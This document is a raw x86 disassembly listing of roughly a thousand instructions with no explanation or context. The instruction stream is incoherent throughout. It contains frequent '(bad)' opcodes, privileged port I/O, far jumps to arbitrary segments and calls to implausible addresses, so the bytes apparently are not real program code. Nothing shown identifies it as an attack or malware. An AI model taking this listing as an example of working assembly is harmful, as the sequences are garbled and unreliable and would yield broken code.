  41adaf:	imul   esp,eax,0x811abc33
  41adb5:	sub    bh,bl
  41adb7:	cmp    edi,DWORD PTR [ebp-0x73]
  41adba:	xor    BYTE PTR [ebx+0x6fec1362],dl
  41adc0:	mov    esi,0x330b20fd
  41adc5:	loop   0x41ada4
  41adc7:	sti    
  41adc8:	add    al,ch
  41adca:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41adcc:	fdivrp st(3),st
  41adce:	ret    
  41adcf:	pop    edx
  41add0:	dec    edi
  41add1:	jl     0x41ad68
  41add3:	std    
  41add4:	pop    ecx
  41add5:	dec    edi
  41add6:	rol    bh,0x95
  41add9:	sbb    DWORD PTR [esi],0x3b
  41addc:	(bad)  
  41addd:	sahf   
  41adde:	sub    ebx,DWORD PTR [edi+0x627fa619]
  41ade4:	rcr    ebx,1
  41ade6:	cdq    
  41ade7:	push   ebp
  41ade8:	inc    edi
  41ade9:	and    DWORD PTR [esp+ebx*8-0x37],esp
  41aded:	out    dx,eax
  41adee:	rol    DWORD PTR [ebx-0x49],0x1f
  41adf2:	jb     0x41ad95
  41adf4:	dec    esi
  41adf5:	mov    bh,0x8a
  41adf7:	push   esp
  41adf8:	cli    
  41adf9:	adc    BYTE PTR [ebx+0x1a],cl
  41adfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adfe:	push   ebp
  41adff:	push   0x97c6f6d4
  41ae04:	jae    0x41ae5a
  41ae06:	shl    al,cl
  41ae08:	push   ecx
  41ae09:	shl    DWORD PTR [eax+0x5fd4c83e],1
  41ae0f:	or     al,0x92
  41ae11:	orps   xmm4,XMMWORD PTR [esi+0x188d5169]
  41ae18:	loope  0x41adfa
  41ae1a:	call   0x7c4f0e23
  41ae1f:	or     edx,DWORD PTR [esi-0x56ae99a3]
  41ae25:	sbb    dl,BYTE PTR [esi+0x7cce8bae]
  41ae2b:	(bad)  
  41ae2c:	mov    edi,0xb5a2bdee
  41ae31:	xchg   ebp,eax
  41ae32:	xor    edx,eax
  41ae34:	adc    BYTE PTR [ebx+0x3],0x3e
  41ae38:	inc    ecx
  41ae39:	xchg   esp,eax
  41ae3a:	pop    eax
  41ae3b:	dec    ebp
  41ae3c:	inc    esp
  41ae3d:	mov    ch,0xec
  41ae3f:	(bad)  
  41ae40:	jge    0x41aeae
  41ae42:	push   esi
  41ae43:	and    eax,0x4d81b12
  41ae48:	test   eax,0x8929a532
  41ae4d:	cmp    al,0xf6
  41ae4f:	in     al,0x5a
  41ae51:	fstp   QWORD PTR [eax+0x5db9254]
  41ae57:	pop    ss
  41ae58:	add    edx,DWORD PTR [ecx+esi*4+0x2d020ecd]
  41ae5f:	dec    esi
  41ae60:	stos   DWORD PTR es:[edi],eax
  41ae61:	rcl    BYTE PTR [edi+0x663bf03c],0x51
  41ae68:	jl     0x41adee
  41ae6a:	clc    
  41ae6b:	mov    al,0x41
  41ae6d:	dec    esi
  41ae6e:	xchg   esi,eax
  41ae6f:	int    0x23
  41ae71:	in     al,0x16
  41ae73:	jp     0x41aee7
  41ae75:	pop    edx
  41ae76:	push   edi
  41ae77:	mov    esi,DWORD PTR [ebp-0x6a4f40a1]
  41ae7d:	push   0x1
  41ae7f:	pusha  
  41ae80:	mov    ebp,eax
  41ae82:	in     al,dx
  41ae83:	mov    esi,0xb18ea935
  41ae88:	xchg   esi,eax
  41ae89:	in     eax,0x95
  41ae8b:	dec    ebp
  41ae8c:	xchg   ebx,eax
  41ae8d:	int3   
  41ae8e:	mov    ch,0x2a
  41ae90:	nop
  41ae91:	lock adc al,dl
  41ae94:	ss push edx
  41ae96:	out    dx,al
  41ae97:	xchg   edi,eax
  41ae98:	test   DWORD PTR [ebx+0x361b8f16],ebx
  41ae9e:	sbb    BYTE PTR [edx-0x49],dl
  41aea1:	jl     0x41ae25
  41aea3:	in     eax,dx
  41aea4:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aea6:	in     eax,dx
  41aea7:	inc    ebx
  41aea8:	and    cl,al
  41aeaa:	inc    esp
  41aeab:	jmp    0xe975:0x3fef919e
  41aeb2:	and    eax,0xd22f0669
  41aeb7:	xchg   esi,eax
  41aeb8:	sub    al,0xe8
  41aeba:	jg     0x41af30
  41aebc:	sbb    BYTE PTR [ecx],dl
  41aebe:	or     al,0x7b
  41aec0:	scas   eax,DWORD PTR es:[edi]
  41aec1:	inc    esp
  41aec2:	and    eax,ebx
  41aec4:	ins    DWORD PTR es:[edi],dx
  41aec5:	fbld   TBYTE PTR [edx-0x2c]
  41aec8:	test   BYTE PTR [edx-0x75f389e7],ch
  41aece:	xor    cl,BYTE PTR [edi-0x3d]
  41aed1:	rol    BYTE PTR [esi],0xce
  41aed4:	mov    WORD PTR [edx],?
  41aed6:	jle    0x41aea6
  41aed8:	das    
  41aed9:	in     al,0x4d
  41aedb:	fisubr DWORD PTR [ebp+edx*2+0x2e]
  41aedf:	xor    ah,bh
  41aee1:	daa    
  41aee2:	pop    ss
  41aee3:	jl     0x41ae90
  41aee5:	imul   eax,ebx,0xe557c528
  41aeeb:	aam    0xa
  41aeed:	pop    edi
  41aeee:	fcomp  st(6)
  41aef0:	xor    BYTE PTR [ebx+0x38d8f7ea],ah
  41aef6:	icebp  
  41aef7:	pop    ebp
  41aef8:	imul   edi,esi,0xe941d46e
  41aefe:	imul   ecx,DWORD PTR [edx-0x4794a8a3],0xc5306408
  41af08:	jno    0x41af64
  41af0a:	addr16 lahf 
  41af0c:	hlt    
  41af0d:	(bad)
  41af11:	mov    db2,edi
  41af14:	gs leave 
  41af16:	sub    BYTE PTR [edi-0x55724529],dh
  41af1c:	jmp    FWORD PTR [eax+edi*8+0x11]
  41af20:	xlat   BYTE PTR ds:[ebx]
  41af21:	es (bad) 
  41af23:	adc    esi,DWORD PTR [ecx-0x55853c05]
  41af29:	sbb    edx,eax
  41af2b:	adc    esp,DWORD PTR [edx+ebx*4]
  41af2e:	in     eax,0x5e
  41af30:	push   es
  41af31:	xchg   edx,eax
  41af32:	dec    ecx
  41af33:	into   
  41af34:	adc    bl,BYTE PTR [esi-0x3d]
  41af37:	add    al,0xa7
  41af39:	jle    0x41aeeb
  41af3b:	lods   al,BYTE PTR ds:[esi]
  41af3c:	dec    esp
  41af3d:	out    0xa5,eax
  41af3f:	mov    eax,0xc4077736
  41af44:	jmp    0x5b800248
  41af49:	xchg   esp,eax
  41af4a:	mov    ebp,0xe94494e3
  41af4f:	in     eax,dx
  41af50:	sub    BYTE PTR [esp+ecx*8+0x52],dh
  41af54:	push   ebx
  41af55:	mov    al,0xe5
  41af57:	(bad)  
  41af58:	and    dh,BYTE PTR [esi]
  41af5a:	test   DWORD PTR [ecx+0x32],ecx
  41af5d:	mov    eax,0xe8f55066
  41af62:	aas    
  41af63:	dec    eax
  41af64:	mov    ds:0x34bca705,eax
  41af69:	mov    ds:0xbb9046b8,al
  41af6e:	lock mov ch,0x7f
  41af71:	stc    
  41af72:	xchg   edi,eax
  41af73:	push   esp
  41af74:	in     al,dx
  41af75:	mov    dl,0x98
  41af77:	rol    dl,1
  41af79:	repnz add esi,DWORD PTR [eax+0x58]
  41af7d:	mov    bl,0x31
  41af7f:	lock dec ebx
  41af81:	icebp  
  41af82:	fwait
  41af83:	jle    0x41af9a
  41af85:	dec    edx
  41af86:	repz loop 0x41afaf
  41af89:	add    DWORD PTR [ecx+0x743670c2],edx
  41af8f:	adc    eax,0x25b64fcd
  41af94:	loope  0x41af5b
  41af96:	inc    ecx
  41af97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af98:	xor    eax,0xb79e7100
  41af9d:	pop    ecx
  41af9e:	and    BYTE PTR [edx-0x44],0x2
  41afa2:	xchg   edi,eax
  41afa3:	fdiv   DWORD PTR [edi]
  41afa5:	inc    ecx
  41afa6:	mov    dl,0x40
  41afa8:	pushf  
  41afa9:	add    eax,esp
  41afab:	jecxz  0x41af6e
  41afad:	call   0xc6af1fd9
  41afb2:	sub    al,0x5d
  41afb4:	jne    0x41af8d
  41afb6:	sbb    eax,0x3a958f74
  41afbb:	or     bl,BYTE PTR [esi-0x62]
  41afbe:	sub    ch,bl
  41afc0:	cwde   
  41afc1:	gs add eax,0xfa3a9690
  41afc7:	cdq    
  41afc8:	outs   dx,DWORD PTR ds:[esi]
  41afc9:	stc    
  41afca:	add    DWORD PTR [edx+0x45],edx
  41afcd:	popa   
  41afce:	out    0xd8,al
  41afd0:	(bad)  
  41afd1:	into   
  41afd2:	das    
  41afd3:	or     esi,DWORD PTR [ecx+eiz*4]
  41afd6:	jb     0x41b03b
  41afd8:	inc    esi
  41afd9:	das    
  41afda:	or     BYTE PTR [eax],dl
  41afdc:	imul   esi,DWORD PTR [ebx-0x107f0499],0x5bb41431
  41afe6:	sbb    ebp,DWORD PTR ds:0xf1d013a7
  41afec:	mov    eax,0x182f9221
  41aff1:	dec    eax
  41aff2:	sub    ah,bl
  41aff4:	inc    eax
  41aff5:	pop    ds
  41aff6:	int    0x16
  41aff8:	pop    es
  41aff9:	pop    edx
  41affa:	mov    edi,0x5fe6b9c0
  41afff:	fs dec ebx
  41b001:	add    DWORD PTR [ebp+0x5ecf3f1b],0x1f
  41b008:	je     0x41afbf
  41b00a:	mov    esp,0x58e322b7
  41b00f:	cmp    DWORD PTR [esi],0xffffffec
  41b012:	fwait
  41b013:	inc    edx
  41b014:	xchg   ebp,eax
  41b015:	xchg   esp,eax
  41b016:	lahf   
  41b017:	inc    eax
  41b018:	mov    ebp,0x22a3fd4f
  41b01d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b01e:	mov    edi,0xe1397d32
  41b023:	ins    DWORD PTR es:[edi],dx
  41b024:	and    eax,0x3e507bf4
  41b029:	mov    bh,ah
  41b02b:	ss dec ebp
  41b02d:	xor    DWORD PTR [ecx+0x6f157cc1],ecx
  41b033:	mov    bl,0xc3
  41b035:	push   edx
  41b036:	stos   BYTE PTR es:[edi],al
  41b037:	sub    BYTE PTR [edi+0x4],ah
  41b03a:	mov    ebx,0x927b7213
  41b03f:	sahf   
  41b040:	loop   0x41b08e
  41b042:	jle    0x41b022
  41b044:	xor    esp,esp
  41b046:	sub    al,0x83
  41b048:	mov    esp,0xd82e456c
  41b04d:	dec    edx
  41b04e:	ror    DWORD PTR [edi],0x47
  41b051:	scas   al,BYTE PTR es:[edi]
  41b052:	xor    eax,0x56d88033
  41b057:	es mov dh,0x8f
  41b05a:	leavew 
  41b05c:	out    dx,eax
  41b05d:	jg     0x41affe
  41b05f:	shr    BYTE PTR [edi-0x39114315],cl
  41b065:	mov    ch,0xa
  41b067:	and    al,0x42
  41b069:	repz imul edx,DWORD PTR [ebp+0xc],0xbf9ef6f
  41b071:	inc    edi
  41b072:	imul   edi,DWORD PTR [ebp+0x1122fb54],0x62
  41b079:	and    eax,0xf1df672f
  41b07e:	test   BYTE PTR [edi+0x63],bh
  41b081:	pop    eax
  41b082:	cmovnp edx,DWORD PTR [ebx+0x4]
  41b086:	jge    0x41b091
  41b088:	and    eax,0x16f4c326
  41b08d:	mov    ?,ecx
  41b08f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b090:	jmp    0x41b058
  41b092:	inc    esp
  41b093:	push   0xbf23449
  41b098:	nop
  41b099:	mov    cl,0xc8
  41b09b:	dec    edi
  41b09c:	xchg   ebx,eax
  41b09d:	test   BYTE PTR [esi-0x65],al
  41b0a0:	test   eax,0x6193229f
  41b0a5:	adc    al,0x56
  41b0a7:	mov    ds:0xc61ccc5b,eax
  41b0ac:	mov    eax,0xe6ba40d9
  41b0b1:	ins    DWORD PTR es:[edi],dx
  41b0b2:	ss jecxz 0x41b0a4
  41b0b5:	adc    al,0xde
  41b0b7:	lods   eax,DWORD PTR ds:[esi]
  41b0b8:	xchg   ebp,eax
  41b0b9:	and    ebx,DWORD PTR ds:0xefb01bc
  41b0bf:	sbb    eax,0x74916ea5
  41b0c4:	xchg   BYTE PTR ds:0x8fdd8345,bl
  41b0ca:	and    BYTE PTR [esi-0x44],dh
  41b0cd:	std    
  41b0ce:	(bad)  
  41b0cf:	mov    dl,0xf6
  41b0d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0d2:	outs   dx,BYTE PTR ds:[esi]
  41b0d3:	pop    esi
  41b0d4:	fs iret 
  41b0d6:	cmp    ch,0xad
  41b0d9:	pop    edx
  41b0da:	in     al,0x7c
  41b0dc:	imul   esp,DWORD PTR [ebx+0x5be3215c],0x7f561318
  41b0e6:	sbb    BYTE PTR [edi+0x131937b1],0x9a
  41b0ed:	popw   ss
  41b0ef:	push   ds
  41b0f0:	cmp    DWORD PTR [ebp+0x6d9349a3],ebp
  41b0f6:	bound  edi,QWORD PTR [ebx+eax*4-0x7a]
  41b0fa:	sub    ah,BYTE PTR [esi]
  41b0fc:	push   es
  41b0fd:	loopne 0x41b0df
  41b0ff:	push   ds
  41b100:	clc    
  41b101:	jmp    DWORD PTR [esp+eax*2+0x2b]
  41b105:	loope  0x41b142
  41b107:	and    eax,0xd41782d5
  41b10c:	out    0x70,al
  41b10e:	fimul  WORD PTR [edi+0x6f]
  41b111:	jmp    0xea33:0x671401cd
  41b118:	mov    ds:0xb90d5135,eax
  41b11d:	jle    0x41b11e
  41b11f:	push   edx
  41b120:	add    eax,0xd6a6a795
  41b125:	idiv   BYTE PTR [edx-0x59cd6694]
  41b12b:	cmp    ebp,ecx
  41b12d:	scas   eax,DWORD PTR es:[edi]
  41b12e:	xor    dl,ah
  41b130:	jl     0x41b102
  41b132:	adc    ecx,DWORD PTR [edi+0x3c01f315]
  41b138:	xor    eax,0x6e69a2fd
  41b13d:	jae    0x41b189
  41b13f:	push   ebp
  41b140:	ret    0xb9c3
  41b143:	bound  edx,QWORD PTR [esi+0x7d]
  41b146:	cld    
  41b147:	jnp    0x41b11a
  41b149:	mov    ebx,0x2f162153
  41b14e:	cli    
  41b14f:	and    al,BYTE PTR [ebx-0x76]
  41b152:	adc    DWORD PTR [edx],eax
  41b154:	and    eax,0x1e6dad19
  41b159:	cs jae 0x41b14c
  41b15c:	sahf   
  41b15d:	jnp    0x41b0f6
  41b15f:	scas   al,BYTE PTR es:[edi]
  41b160:	mov    bh,0xe8
  41b162:	call   0x12106758
  41b167:	mov    ch,0x15
  41b169:	adc    al,0xf8
  41b16b:	mov    edi,0x5241d72
  41b170:	mov    BYTE PTR [ebp-0x25f6c45f],cl
  41b176:	add    al,0xc6
  41b178:	dec    ecx
  41b179:	lea    esi,[eax]
  41b17b:	push   es
  41b17c:	push   ds
  41b17d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b17e:	ret    0xc05a
  41b181:	push   ebp
  41b182:	daa    
  41b183:	popa   
  41b184:	int    0x88
  41b186:	jns    0x41b13d
  41b188:	mov    esi,0xaafc0c8b
  41b18d:	rcr    BYTE PTR [esi],1
  41b18f:	dec    esi
  41b190:	xor    esp,DWORD PTR [edx]
  41b192:	imul   esp,DWORD PTR [edx-0x1d99d61f],0xfa3b3839
  41b19c:	jmp    0x41b6ae
  41b1a1:	(bad)
  41b1a4:	retf   0xdad9
  41b1a7:	leave  
  41b1a8:	shr    DWORD PTR [eax-0x1f4a86c6],cl
  41b1ae:	popa   
  41b1af:	ret    0x4ded
  41b1b2:	mov    DWORD PTR [edi+0x78],edi
  41b1b5:	jae    0x41b233
  41b1b7:	js     0x41b231
  41b1b9:	jae    0x41b155
  41b1bb:	push   ds
  41b1bc:	xor    bl,BYTE PTR ds:0x1d3bef1d
  41b1c2:	je     0x41b17f
  41b1c4:	ins    BYTE PTR es:[edi],dx
  41b1c5:	pop    esi
  41b1c6:	arpl   si,sp
  41b1c8:	and    DWORD PTR [ebp+ecx*8+0x73ea7d3f],0xffffffee
  41b1d0:	retf   
  41b1d1:	outs   dx,DWORD PTR ds:[esi]
  41b1d2:	dec    edi
  41b1d3:	mov    ss,WORD PTR [edi+0x4]
  41b1d6:	inc    eax
  41b1d7:	and    DWORD PTR [ebx+0x4b81b3bb],edi
  41b1dd:	in     eax,dx
  41b1de:	mov    ebp,0xd19d8410
  41b1e3:	ret    0xef79
  41b1e6:	adc    bl,BYTE PTR [eax+0x5979a338]
  41b1ec:	jl     0x41b1c5
  41b1ee:	push   ecx
  41b1ef:	or     edi,DWORD PTR [edx]
  41b1f1:	scas   al,BYTE PTR es:[edi]
  41b1f2:	or     BYTE PTR [edx-0x7d],al
  41b1f5:	add    BYTE PTR [ebx+ebp*4],ch
  41b1f8:	xor    ebx,DWORD PTR [esi+0x5d]
  41b1fb:	jmp    0x38ac68f4
  41b200:	pop    ds
  41b201:	fld    TBYTE PTR [edi]
  41b203:	lahf   
  41b204:	adc    BYTE PTR [eax],ah
  41b206:	adc    dh,cl
  41b208:	sbb    BYTE PTR [eax+0x4630b1e9],ch
  41b20e:	xchg   edx,eax
  41b20f:	ret    
  41b210:	pop    ebp
  41b211:	cmc    
  41b212:	div    BYTE PTR [eax+0x15]
  41b215:	leave  
  41b216:	mul    BYTE PTR [edi-0x3c]
  41b219:	(bad)  
  41b21a:	inc    ebp
  41b21b:	jo     0x41b1d1
  41b21d:	xor    ch,dl
  41b21f:	dec    edx
  41b220:	std    
  41b221:	fstp   DWORD PTR [ecx+0x2e]
  41b224:	inc    ecx
  41b225:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b226:	sbb    al,0x98
  41b228:	add    DWORD PTR [ecx-0x633f116e],esp
  41b22e:	dec    esp
  41b22f:	dec    ebp
  41b230:	pop    edi
  41b231:	ja     0x41b286
  41b233:	fwait
  41b234:	(bad)  
  41b235:	ficom  WORD PTR [esi]
  41b237:	popa   
  41b238:	cs dec ebx
  41b23a:	xor    al,0x9
  41b23c:	iret   
  41b23d:	inc    ecx
  41b23e:	jmp    0x41b241
  41b240:	fdivr  QWORD PTR [ecx+0x65c566b9]
  41b246:	aam    0xcd
  41b248:	xchg   esp,eax
  41b249:	mov    ah,0xac
  41b24b:	dec    ecx
  41b24c:	ss mov edx,0x6880463
  41b252:	pop    esp
  41b253:	loop   0x41b23e
  41b255:	dec    edi
  41b256:	mov    ss,WORD PTR [eax+0x74fac0ab]
  41b25c:	int3   
  41b25d:	sub    ebp,DWORD PTR es:[ebp-0x3c]
  41b261:	in     eax,dx
  41b262:	dec    ecx
  41b263:	mov    ah,0x5b
  41b265:	imul   ebp,DWORD PTR [ecx],0x4f27633d
  41b26b:	stc    
  41b26c:	mov    ebx,0x495bc664
  41b271:	jnp    0x41b2d2
  41b273:	jns    0x41b21c
  41b275:	out    dx,eax
  41b276:	repnz pop edi
  41b278:	scas   eax,DWORD PTR es:[edi]
  41b279:	mov    edx,0xd164d90e
  41b27e:	adc    al,0x59
  41b280:	retf   
  41b281:	push   DWORD PTR cs:[eax]
  41b284:	push   ss
  41b285:	je     0x41b2cf
  41b287:	jmp    0xe5c:0xe6877356
  41b28e:	fst    QWORD PTR [esp+edi*1]
  41b291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b292:	pop    eax
  41b294:	shufps xmm1,XMMWORD PTR [ecx+0x1],0xc8
  41b299:	jb     0x41b304
  41b29b:	xchg   edx,eax
  41b29c:	xlat   BYTE PTR ds:[ebx]
  41b29d:	sbb    eax,0x280b927e
  41b2a2:	pop    ebp
  41b2a3:	out    0x40,al
  41b2a5:	ror    BYTE PTR [ebx-0x7b23f68d],1
  41b2ab:	jns    0x41b28f
  41b2ad:	fstp   st(4)
  41b2af:	fst    DWORD PTR [ebp+0x12]
  41b2b2:	inc    esi
  41b2b3:	inc    esp
  41b2b4:	mov    WORD PTR [ebp-0x6b01dcad],ds
  41b2ba:	in     eax,0x6d
  41b2bc:	pop    eax
  41b2bd:	lods   al,BYTE PTR ds:[esi]
  41b2be:	into   
  41b2bf:	(bad)  
  41b2c0:	push   cs
  41b2c1:	sub    esi,edx
  41b2c3:	add    DWORD PTR [esi+eax*4-0x40],esp
  41b2c7:	jae    0x41b337
  41b2c9:	fwait
  41b2ca:	sbb    cl,BYTE PTR [ebx-0x73d88c96]
  41b2d0:	call   0xd1394393
  41b2d5:	cmp    eax,edi
  41b2d7:	pop    ebx
  41b2d8:	sub    BYTE PTR [ecx-0x597255be],cl
  41b2de:	pop    ebp
  41b2df:	pop    ecx
  41b2e0:	je     0x41b299
  41b2e2:	xor    esp,ebx
  41b2e4:	sti    
  41b2e5:	in     eax,0x2
  41b2e7:	hlt    
  41b2e8:	inc    ebx
  41b2e9:	ret    0x5406
  41b2ec:	mov    ah,0xd1
  41b2ee:	ins    BYTE PTR es:[edi],dx
  41b2ef:	push   esp
  41b2f0:	add    eax,0xfbdac25b
  41b2f5:	rol    BYTE PTR [ebx+0x6b],1
  41b2f8:	xor    BYTE PTR [eax+0x5b2eb23b],bl
  41b2fe:	xchg   ebp,eax
  41b2ff:	sub    eax,0xff1d7016
  41b304:	inc    esi
  41b305:	(bad)
  41b308:	inc    ebp
  41b309:	(bad)  
  41b30a:	in     eax,0x5c
  41b30c:	out    0x57,al
  41b30e:	add    eax,0xe8255de5
  41b313:	dec    ebp
  41b314:	or     DWORD PTR [edx],ecx
  41b316:	jnp    0x41b29f
  41b318:	pop    ds
  41b319:	add    al,0xf0
  41b31b:	(bad)  
  41b31c:	ficom  DWORD PTR [ebx-0x26]
  41b31f:	jno    0x41b2c7
  41b321:	cmp    eax,0xa6b4177f
  41b326:	jbe    0x1ed28554
  41b32c:	sbb    BYTE PTR [edx-0x5],bh
  41b32f:	and    al,0xa6
  41b331:	xchg   edi,eax
  41b332:	pop    ebx
  41b333:	repnz sbb al,0x7b
  41b336:	in     eax,dx
  41b337:	jb     0x41b3b6
  41b339:	xor    al,0x8
  41b33b:	das    
  41b33c:	mov    ebx,0xe6cbf342
  41b341:	stos   BYTE PTR es:[di],al
  41b343:	xchg   ecx,eax
  41b344:	or     DWORD PTR [ebx],0xf7c40333
  41b34a:	sbb    BYTE PTR [esi+0x2cc0add8],bl
  41b350:	inc    eax
  41b351:	mov    al,0xde
  41b353:	or     eax,DWORD PTR [edi]
  41b355:	push   ebx
  41b356:	shr    BYTE PTR [edi],cl
  41b358:	pop    eax
  41b359:	pop    esp
  41b35a:	lahf   
  41b35b:	sbb    BYTE PTR [ecx+esi*1],cl
  41b35e:	pop    ss
  41b35f:	pop    ebp
  41b360:	and    ecx,DWORD PTR [ebx]
  41b362:	inc    ebp
  41b363:	sbb    BYTE PTR [ecx+0x6d1b6132],al
  41b369:	fnsave [edi+0x6020b2e9]
  41b36f:	cmp    DWORD PTR [eax+0x482b0111],ecx
  41b375:	mov    al,0xc6
  41b377:	leave  
  41b378:	cmp    DWORD PTR [ecx],0x45281a78
  41b37e:	repnz test BYTE PTR [ecx],al
  41b381:	xchg   edx,eax
  41b382:	mov    al,0x72
  41b384:	js     0x41b360
  41b386:	sub    al,0xb0
  41b388:	pop    ds
  41b389:	jl     0x41b31a
  41b38b:	pop    edi
  41b38c:	sbb    al,0x73
  41b38e:	xchg   BYTE PTR [esi+eax*4+0x7f918e64],ch
  41b395:	hlt    
  41b396:	sti    
  41b397:	shl    DWORD PTR ds:0x7e9d8696,0xb9
  41b39e:	push   cs
  41b39f:	pop    ecx
  41b3a0:	outs   dx,BYTE PTR ds:[esi]
  41b3a1:	gs mov ecx,0x4b0dca48
  41b3a7:	std    
  41b3a8:	sbb    al,0x75
  41b3aa:	mov    ah,0x93
  41b3ac:	es jle 0x41b3be
  41b3af:	jbe    0x41b3ed
  41b3b1:	lods   al,BYTE PTR ds:[esi]
  41b3b2:	inc    ebx
  41b3b3:	cld    
  41b3b4:	xor    DWORD PTR [eax+esi*1],esp
  41b3b7:	inc    edi
  41b3b8:	sbb    DWORD PTR [esi-0xfa17da6],0xffffff83
  41b3bf:	imul   eax,esp,0xba4561a7
  41b3c5:	in     al,dx
  41b3c6:	or     al,BYTE PTR [eax+0x47]
  41b3c9:	ins    BYTE PTR es:[edi],dx
  41b3ca:	adc    al,0x3e
  41b3cc:	jne    0x41b440
  41b3ce:	dec    eax
  41b3cf:	aam    0xf0
  41b3d1:	ror    DWORD PTR [ebx-0x185dfb15],cl
  41b3d7:	adc    edi,DWORD PTR [esi]
  41b3d9:	push   cs
  41b3da:	in     eax,0x2c
  41b3dc:	pcmpeqw mm6,QWORD PTR [eax+0x4d2df4c6]
  41b3e3:	xchg   DWORD PTR [ebp+0x1e67633f],esp
  41b3e9:	cmp    DWORD PTR [eax],eax
  41b3eb:	xor    bl,BYTE PTR [eax]
  41b3ed:	ret    
  41b3ee:	adc    ch,BYTE PTR [ecx+edi*8]
  41b3f1:	mov    al,ds:0x11f1bde9
  41b3f6:	pop    eax
  41b3f7:	sti    
  41b3f8:	and    esi,edi
  41b3fa:	fcmovnu st,st(0)
  41b3fc:	(bad)  
  41b3fd:	mov    ebp,DWORD PTR [edi+ebp*4-0x73f8fa37]
  41b404:	inc    ebp
  41b405:	lock pushf 
  41b407:	add    ch,BYTE PTR [esi*1+0x78809df0]
  41b40e:	imul   ebp,DWORD PTR [ecx-0x2749e9cf],0xa9e5dbc0
  41b418:	stos   DWORD PTR es:[edi],eax
  41b419:	add    DWORD PTR [esi],ebx
  41b41b:	push   0xffffffa2
  41b41d:	cdq    
  41b41e:	scas   eax,DWORD PTR es:[edi]
  41b41f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b420:	sbb    al,0xd6
  41b422:	mov    bh,0xb4
  41b424:	call   0x9fcf8074
  41b429:	aas    
  41b42a:	inc    esi
  41b42b:	lods   eax,DWORD PTR ds:[esi]
  41b42c:	cld    
  41b42d:	aad    0xb0
  41b42f:	pop    eax
  41b430:	inc    esi
  41b431:	mov    BYTE PTR [esi-0x83ab155],dl
  41b437:	int    0xc2
  41b439:	jae    0x41b400
  41b43b:	xchg   edx,eax
  41b43c:	jmp    0xd3651769
  41b441:	retf   
  41b442:	mov    cs,ecx
  41b444:	cmp    DWORD PTR [eax+0x47de46dd],edx
  41b44a:	pop    es
  41b44b:	mov    cl,0xf
  41b44d:	mov    edx,0xa6aa2f2a
  41b452:	push   esi
  41b453:	jnp    0x41b3ea
  41b455:	call   edi
  41b457:	(bad)  
  41b458:	stos   BYTE PTR es:[edi],al
  41b459:	mov    bl,BYTE PTR [ecx+0x42]
  41b45c:	dec    edx
  41b45d:	xchg   edi,eax
  41b45e:	fst    QWORD PTR [esi+0x45]
  41b461:	pop    eax
  41b462:	cmp    eax,0xba64a5a5
  41b467:	test   BYTE PTR [edx-0x2506cd0f],bh
  41b46d:	add    ebx,DWORD PTR [esi]
  41b46f:	or     BYTE PTR [eax+eiz*4],0x86
  41b473:	inc    ecx
  41b474:	sbb    DWORD PTR [edi+0x7e],ebx
  41b477:	psubusb mm4,mm2
  41b47a:	dec    edx
  41b47b:	or     dl,BYTE PTR [edx+eax*1-0x45c412a0]
  41b482:	dec    edx
  41b483:	rcl    DWORD PTR [esi+0x732c422],cl
  41b489:	inc    ebx
  41b48a:	setae  BYTE PTR [edx-0x36be8f5d]
  41b491:	pop    eax
  41b492:	inc    esp
  41b493:	scas   al,BYTE PTR es:[edi]
  41b494:	test   BYTE PTR es:[eax-0x366abf77],cl
  41b49b:	push   edx
  41b49c:	cli    
  41b49d:	mov    ebp,0x1ccce6ee
  41b4a2:	mov    dh,0x6f
  41b4a4:	imul   edx,DWORD PTR [ebx+0x6db4d22b],0xdfbdcd8
  41b4ae:	ins    BYTE PTR es:[edi],dx
  41b4af:	cmp    ebx,DWORD PTR [ecx]
  41b4b1:	(bad)  
  41b4b2:	jge    0x41b4a3
  41b4b4:	call   0x33d85a1b
  41b4b9:	adc    DWORD PTR [ebx-0x29d2ab20],edx
  41b4bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4c0:	arpl   WORD PTR [eax],bx
  41b4c2:	pop    edx
  41b4c3:	mov    ah,BYTE PTR [ebx+ebp*8-0x38]
  41b4c7:	sub    eax,0xb17e7bda
  41b4cc:	pushf  
  41b4cd:	xchg   ebx,eax
  41b4ce:	jmp    0x41b505
  41b4d0:	mov    esi,0x9dfbbfba
  41b4d5:	push   0x3f
  41b4d7:	pop    esi
  41b4d8:	add    ah,BYTE PTR [ebx+0x3e06778a]
  41b4de:	xor    ebp,DWORD PTR [edx-0x3405b932]
  41b4e4:	dec    ecx
  41b4e5:	addr16 das 
  41b4e7:	cdq    
  41b4e8:	cmp    eax,0xf1623066
  41b4ed:	sub    al,0x8c
  41b4ef:	or     al,0xdf
  41b4f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4f2:	mov    ebx,0xb9684f9
  41b4f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4f8:	or     BYTE PTR [edi],ch
  41b4fa:	sbb    al,0xf5
  41b4fc:	mov    bl,0x3e
  41b4fe:	ja     0x41b495
  41b500:	jle    0x41b525
  41b502:	pop    edi
  41b503:	div    DWORD PTR [edx+edi*8-0x64681fd3]
  41b50a:	jne    0x41b535
  41b50c:	jge    0x41b544
  41b50e:	sbb    DWORD PTR [ecx+ebp*2],0xffffffb2
  41b512:	repnz mov ecx,0x858c87bd
  41b518:	(bad)  
  41b519:	sti    
  41b51a:	mov    al,ds:0x46a5b3fe
  41b51f:	sub    esp,DWORD PTR [ebx*2+0x10a469c9]
  41b526:	imul   ebp,DWORD PTR [edx],0x6d
  41b529:	leave  
  41b52a:	and    al,0x90
  41b52c:	data16 sar BYTE PTR [edx],cl
  41b52f:	js     0x41b59e
  41b531:	sahf   
  41b532:	dec    edi
  41b533:	ret    
  41b534:	jg     0x41b4f0
  41b536:	sbb    dl,cl
  41b538:	push   ecx
